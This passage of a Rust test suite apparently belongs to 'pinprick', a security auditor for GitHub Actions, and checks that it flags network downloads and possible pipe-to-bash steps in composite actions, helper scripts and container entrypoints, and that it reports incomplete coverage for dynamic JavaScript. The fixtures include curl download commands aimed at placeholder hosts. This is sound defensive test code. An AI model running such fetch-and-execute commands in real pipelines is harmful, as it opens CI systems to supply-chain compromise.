                ("install.sh", "echo harmless\n"),
                ("sub/install.sh", CURL_BASH),
            ],
        ),
        (
            composite_shell,
            vec![
                ("main.sh", "env bash \"$(dirname \"$0\")/install.sh\"\n"),
                ("install.sh", CURL_BASH),
            ],
        ),
    ];
    for (action, files) in &cases {
        let (code, report) = audit_local_action(action, files);
        assert_eq!(code, Some(1), "{action} {files:?}: {report}");
        assert_eq!(report["coverage_complete"], true, "{action} {files:?}");
        assert_eq!(
            report["findings"][0]["severity"], "high",
            "{action} {files:?}: {report}"
        );
    }
}

#[test]
fn composite_steps_follow_helpers_through_every_interpreter() {
    let composite = |shell: &str, run: &str| {
        serde_json::json!({
            "name": "local",
            "description": "local",
            "runs": { "using": "composite", "steps": [{ "shell": shell, "run": run }] }
        })
        .to_string()
    };
    let cases: Vec<(String, Vec<(&str, &str)>)> = vec![
        (
            composite("bash", "cd \"$GITHUB_ACTION_PATH\"\nenv bash helper.sh"),
            vec![(
                "helper.sh",
                "curl -sSfL https://example.invalid/tool -o tool\n",
            )],
        ),
        (
            composite("bash", "cd \"$GITHUB_ACTION_PATH\"\nbash helper.js"),
            vec![(
                "helper.js",
                "curl -sSfL https://example.invalid/tool -o tool\n",
            )],
        ),
        (
            composite(
                "python",
                "import os, subprocess\nsubprocess.run([\"bash\", os.path.join(os.environ[\"GITHUB_ACTION_PATH\"], \"helper.sh\")])",
            ),
            vec![(
                "helper.sh",
                "curl -sSfL https://example.invalid/tool -o tool\n",
            )],
        ),
        (
            composite(
                "node {0}",
                "const path = require('node:path');\nrequire('node:child_process').execFileSync('bash', [path.join(process.env.GITHUB_ACTION_PATH, 'helper.sh')]);",
            ),
            vec![(
                "helper.sh",
                "curl -sSfL https://example.invalid/tool -o tool\n",
            )],
        ),
        (
            composite(
                "bash",
                "cd \"$GITHUB_ACTION_PATH\"\ncd scripts\nbash helper.sh",
            ),
            vec![
                ("scripts/helper.sh", "bash child.sh\n"),
                (
                    "scripts/child.sh",
                    "curl -sSfL https://example.invalid/tool -o tool\n",
                ),
            ],
        ),
    ];
    for (action, files) in &cases {
        let (code, report) = audit_local_action(action, files);
        assert_eq!(code, Some(1), "{action}: {report}");
        assert_eq!(report["coverage_complete"], true, "{action}");
    }
}

#[test]
fn container_entrypoints_are_scanned_whatever_their_names() {
    for (copy, entrypoint) in [
        (
            "COPY entrypoint /entrypoint",
            "ENTRYPOINT [\"/bin/sh\", \"/entrypoint\"]",
        ),
        (
            "COPY entrypoint /usr/local/bin/",
            "ENTRYPOINT [\"/usr/local/bin/entrypoint\"]",
        ),
        ("WORKDIR /app\nCOPY . .", "CMD [\"sh\", \"entrypoint\"]"),
    ] {
        let dir = common::repo_with_workflow(
            "ci.yml",
            "name: local\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./act\n",
        );
        let action = dir.path().join("act");
        std::fs::create_dir_all(&action).unwrap();
        std::fs::write(
            action.join("Dockerfile"),
            format!(
                "FROM alpine:3.20@sha256:{}\n{copy}\n{entrypoint}\n",
                "a".repeat(64)
            ),
        )
        .unwrap();
        std::fs::write(
            action.join("entrypoint"),
            "curl -sSfL https://example.invalid/tool -o tool\n",
        )
        .unwrap();
        let output = common::pinprick_cmd()
            .args(["--json", "audit"])
            .arg(dir.path())
            .output()
            .unwrap();
        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(output.status.code(), Some(1), "{copy}: {report}");
        assert_eq!(
            report["findings"][0]["source_file"], "./act (entrypoint)",
            "{copy}"
        );
    }
}

#[test]
fn helper_downloads_withhold_composite_verification() {
    let steps = |helper: &str| {
        serde_json::json!({
            "name": "local",
            "description": "local",
            "runs": { "using": "composite", "steps": [
                { "shell": "bash", "run": helper },
                { "shell": "bash", "run": "curl -o tool https://example.com/tool\ncosign verify-blob --key key.pem --signature trusted.sig tool" },
            ] }
        })
        .to_string()
    };
    for (helper, file, content, expected) in [
        (
            "python3 \"${{ github.action_path }}/key.py\"",
            "key.py",
            "import urllib.request\nopen('key.pem', 'wb').write(urllib.request.urlopen('https://example.com/v1.2.3/key.pem').read())\n",
            1,
        ),
        (
            "bash \"${{ github.action_path }}/key.sh\"",
            "key.sh",
            "curl -o key.pem https://example.com/v1.2.3/key.pem\n",
            1,
        ),
        (
            "python3 \"${{ github.action_path }}/key.py\"",
            "key.py",
            "print('hello')\n",
            0,
        ),
    ] {
        let (code, report) = audit_local_action(&steps(helper), &[(file, content)]);
        assert_eq!(
            report["findings"].as_array().unwrap().len(),
            expected,
            "{content}: {report}"
        );
        assert_eq!(code, Some(expected as i32), "{content}");
    }
}

#[test]
fn harmless_action_location_references_stay_complete() {
    let unrelated = ("scripts/release.sh", CURL_BASH);
    let cases: Vec<(String, Vec<(&str, &str)>)> = vec![
        (
            composite_action(
                "bash",
                "echo \"Using $GITHUB_ACTION_PATH\"\nls \"$GITHUB_ACTION_PATH\"",
                None,
            ),
            vec![unrelated],
        ),
        (
            composite_action(
                "pwsh",
                "Write-Host \"Action at $env:GITHUB_ACTION_PATH\"",
                None,
            ),
            vec![unrelated],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const fs = require('fs'), path = require('path');\nfs.readFileSync(path.join(__dirname, 'config.json'));\nrequire('child_process').execSync('git status', { cwd: __dirname });\n",
                ),
                ("config.json", "{}"),
                unrelated,
            ],
        ),
        (
            composite_action("bash", "python3 \"$GITHUB_ACTION_PATH/main.py\"", None),
            vec![
                (
                    "main.py",
                    "import os, subprocess\nopen(os.path.join(os.path.dirname(__file__), 'data.txt'))\nsubprocess.run(['git', 'status'], cwd=os.path.dirname(__file__))\n",
                ),
                ("data.txt", "x"),
                unrelated,
            ],
        ),
        (
            composite_action("bash", "bash \"$GITHUB_ACTION_PATH/main.sh\"", None),
            vec![
                (
                    "main.sh",
                    "SCRIPT_DIR=$(dirname \"$0\")\ncat \"$SCRIPT_DIR/config.json\"\n",
                ),
                ("config.json", "{}"),
                unrelated,
            ],
        ),
    ];
    for (action, files) in &cases {
        let (code, report) = audit_local_action(action, files);
        assert_eq!(code, Some(0), "{action}: {report}");
        assert_eq!(report["coverage_complete"], true, "{action}");
    }
}

#[test]
fn dynamic_javascript_coverage_failure_identifies_its_source_in_every_format() {
    let dir = common::repo_with_local_action(
        "name: test\ndescription: test\nruns:\n  using: node24\n  main: index.js\n",
        &[(
            "index.js",
            r#"import { createRequire } from 'node:module';
const load = createRequire(import.meta.url);
const cp = require('child_process');
function makePredicate(body) {
  return new Function('x', 'return x + 1');
}
cp.execFileSync(load('os').tmpdir() + '/tool', []);
"#,
        )],
    );
    let diagnostic = "./act (index.js:5): dynamic JavaScript evaluation contributes to incomplete coverage: standard module loading cannot be assumed";
    for format in ["human", "json", "sarif"] {
        let mut command = common::pinprick_cmd();
        command.arg("audit").arg("--no-audited-catalog");
        if format != "human" {
            command.arg(format!("--{format}"));
        }
        let output = command.arg(dir.path()).output().unwrap();
        assert_eq!(output.status.code(), Some(2), "{format}");
        assert!(
            String::from_utf8_lossy(&output.stderr).contains(diagnostic),
            "{format}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        if format == "human" {
            assert!(String::from_utf8_lossy(&output.stdout).contains(diagnostic));
        } else {
            let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
            let failures = if format == "json" {
                assert_eq!(report["coverage_complete"], false);
                &report["coverage_failures"]
            } else {
                assert_eq!(
                    report["runs"][0]["properties"]["pinprickCoverageComplete"],
                    false
                );
                &report["runs"][0]["properties"]["pinprickCoverageFailures"]
            };
            assert!(
                failures
                    .as_array()
                    .unwrap()
                    .iter()
                    .any(|failure| failure == diagnostic),
                "{report}"
            );
        }
    }
}

#[test]
fn dynamic_javascript_does_not_explain_unrelated_incompleteness() {
    let dir = common::repo_with_local_action(
        &node_action("index.js"),
        &[
            (
                "index.js",
                "require('./missing');\nnew Function('x', 'return x + 1');\nrequire('child_process').execFileSync(__dirname + '/tool.sh');\n",
            ),
            ("tool.sh", "echo ok\n"),
        ],
    );
    for format in ["human", "json", "sarif"] {
        let mut command = common::pinprick_cmd();
        command.args(["audit", "--no-audited-catalog"]);
        if format != "human" {
            command.arg(format!("--{format}"));
        }
        let output = command.arg(dir.path()).output().unwrap();
        assert_eq!(output.status.code(), Some(2), "{format}");
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert!(
            stderr.contains("incomplete scan of local action ./act"),
            "{stderr}"
        );
        assert!(
            stdout.contains("incomplete local action scan for ./act"),
            "{stdout}"
        );
        assert!(
            !stderr.contains("dynamic JavaScript evaluation"),
            "{format}: {stderr}"
        );
        assert!(
            !stdout.contains("dynamic JavaScript evaluation"),
            "{format}: {stdout}"
        );
    }
    let source = dir.path().join("act/index.js");
    let code = std::fs::read_to_string(&source).unwrap();
    std::fs::write(&source, code.replace("require('./missing');\n", "")).unwrap();
    let output = common::pinprick_cmd()
        .args(["audit", "--no-audited-catalog", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(0));
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["coverage_complete"], true);
}

#[test]
fn dynamic_javascript_does_not_explain_other_execution_failures() {
    for execution in [
        "require('child_process').execFileSync(__dirname + '/missing.sh');",
        "require('child_process').execFileSync(__dirname + '/' + process.env.TOOL);",
        "const tool = __dirname + ;",
    ] {
        let (code, report) = audit_local_action(
            &node_action("index.js"),
            &[
                (
                    "index.js",
                    "require('./helper');\nnew Function('x', 'return x + 1');\n",
                ),
                ("helper.js", execution),
            ],
        );
        assert_eq!(code, Some(2), "{execution}: {report}");
        assert_eq!(report["coverage_complete"], false);
        assert!(report["findings"].as_array().unwrap().is_empty());
        assert!(
            !report.to_string().contains("dynamic JavaScript evaluation"),
            "{execution}: {report}"
        );
    }
}

#[test]
fn dynamic_javascript_does_not_explain_other_loader_replacements() {
    let execution = "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nrequire('child_process').execFileSync(load('os').tmpdir() + '/tool');\n";
    for replacement in [
        "require('module')._load = () => {};",
        "const broken = __dirname + ;",
    ] {
        for same_file in [false, true] {
            let evaluation = "new Function('x', 'return x + 1');\n";
            let helper = if same_file {
                format!("{evaluation}{replacement}\n")
            } else {
                format!("{replacement}\n")
            };
            let main = format!(
                "require('./helper');\n{}{execution}",
                if same_file { "" } else { evaluation }
            );
            let (code, report) = audit_local_action(
                &node_action("index.js"),
                &[("index.js", &main), ("helper.js", &helper)],
            );
            assert_eq!(code, Some(2), "{replacement}: {report}");
            assert_eq!(report["coverage_complete"], false);
            assert!(report["findings"].as_array().unwrap().is_empty());
            assert!(
                !report.to_string().contains("dynamic JavaScript evaluation"),
                "{replacement}, same file {same_file}: {report}"
            );
        }
    }
}

#[test]
fn dynamic_javascript_without_located_execution_stays_complete() {
    let dir = common::repo_with_local_action(
        &node_action("index.js"),
        &[(
            "index.js",
            "const f = new Function('x', 'return x + 1');\nf(1);\n",
        )],
    );
    let output = common::pinprick_cmd()
        .args(["audit", "--no-audited-catalog", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(0));
    assert!(!String::from_utf8_lossy(&output.stderr).contains("dynamic JavaScript evaluation"));
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["coverage_complete"], true);
    assert!(report.get("coverage_failures").is_none());
}

#[test]
fn dynamic_javascript_diagnostics_identify_a_contributing_cause() {
    for (extra, helper, content, explains) in [
        (
            "require('./helper');",
            "helper.js",
            "require('child_process').execFileSync(__dirname + '/missing.sh');",
            true,
        ),
        (
            "require('./missing');",
            "helper.js",
            "module.exports = {};",
            true,
        ),
        (
            "require('./node_modules/helper');",
            "node_modules/helper/index.js",
            "require('module')._load = () => {};",
            true,
        ),
        (
            "require('child_process').execFileSync(__dirname + '/missing.sh');",
            "helper.js",
            "module.exports = {};",
            false,
        ),
    ] {
        for evaluation in ["new Function('x', 'return x + 1');", ""] {
            let source = format!(
                "import {{ createRequire }} from 'node:module';\nconst load = createRequire(import.meta.url);\n{evaluation}\n{extra}\nrequire('child_process').execFileSync(load('os').tmpdir() + '/tool');\n"
            );
            let dir = common::repo_with_local_action(
                &node_action("index.js"),
                &[("index.js", &source), (helper, content)],
            );
            for format in ["human", "json", "sarif"] {
                let mut command = common::pinprick_cmd();
                command.args(["audit", "--no-audited-catalog"]);
                if format != "human" {
                    command.arg(format!("--{format}"));
                }
                let output = command.arg(dir.path()).output().unwrap();
                assert_eq!(output.status.code(), Some(2), "{extra}, {format}");
                let stdout = String::from_utf8_lossy(&output.stdout);
                assert!(
                    stdout.contains("incomplete local action scan for ./act"),
                    "{stdout}"
                );
                for bytes in [&output.stdout, &output.stderr] {
                    let text = String::from_utf8_lossy(bytes);
                    assert_eq!(
                        text.contains(
                            "dynamic JavaScript evaluation contributes to incomplete coverage"
                        ),
                        explains && !evaluation.is_empty(),
                        "{extra}, {format}: {text}"
                    );
                }
            }
        }
    }
}

#[test]
fn located_javascript_without_dynamic_evaluation_stays_complete() {
    let dir = common::repo_with_local_action(
        &node_action("index.js"),
        &[(
            "index.js",
            "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nconst cp = require('child_process');\nfunction makePredicate(body) {\n  return body;\n}\ncp.execFileSync(load('os').tmpdir() + '/tool', []);\n",
        )],
    );
    let output = common::pinprick_cmd()
        .args(["audit", "--no-audited-catalog", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(0));
    assert!(!String::from_utf8_lossy(&output.stderr).contains("dynamic JavaScript evaluation"));
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["coverage_complete"], true);
    assert!(report.get("coverage_failures").is_none());
}

#[test]
fn dynamic_javascript_coverage_summarizes_lines_once_per_file() {
    let first_line = "new Function('x', 'return x'); new Function('y', 'return y');\n";
    for newline in ["\n", "\r\n"] {
        for (evaluations, suffix) in [
            (first_line.to_string(), ""),
            (
                format!(
                    "{first_line}\nnew Function('z', 'return z');\nnew Function('value', 'return value');\n"
                ),
                " (2 additional locations)",
            ),
        ] {
            let code = format!("import {{ createRequire }} from 'node:module';\nconst load = createRequire(import.meta.url);\nconst cp = require('child_process');\nrequire('./helper');\n{evaluations}cp.execFileSync(load('os').tmpdir() + '/tool', []);\n").replace('\n', newline);
            let dir = common::repo_with_local_action(
                &node_action("index.js"),
                &[("index.js", &code), ("helper.js", "module.exports = {};\n")],
            );
            let diagnostic = format!(
                "./act (index.js:5): dynamic JavaScript evaluation contributes to incomplete coverage: standard module loading cannot be assumed{suffix}"
            );
            for format in ["human", "json", "sarif"] {
                let mut command = common::pinprick_cmd();
                command.args(["audit", "--no-audited-catalog"]);
                if format != "human" {
                    command.arg(format!("--{format}"));
                }
                let output = command.arg(dir.path()).output().unwrap();
                assert_eq!(output.status.code(), Some(2));
                for bytes in [&output.stdout, &output.stderr] {
                    let text = String::from_utf8_lossy(bytes);
                    assert_eq!(
                        text.matches("dynamic JavaScript evaluation").count(),
                        1,
                        "{format}: {text}"
                    );
                    assert!(text.contains(&diagnostic), "{format}: {text}");
                }
            }
        }
    }
}

#[test]
fn score_does_not_emit_dynamic_javascript_audit_diagnostics() {
    let dir = common::repo_with_local_action(
        &node_action("index.js"),
        &[(
            "index.js",
            "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nnew Function('x', 'return x');\nrequire('child_process').execFileSync(load('os').tmpdir() + '/tool', []);\n",
        )],
    );
    let output = common::pinprick_cmd()
        .args(["score", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(0));
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["coverage_complete"], false);
    for bytes in [&output.stdout, &output.stderr] {
        assert!(!String::from_utf8_lossy(bytes).contains("dynamic JavaScript evaluation"));
    }
}
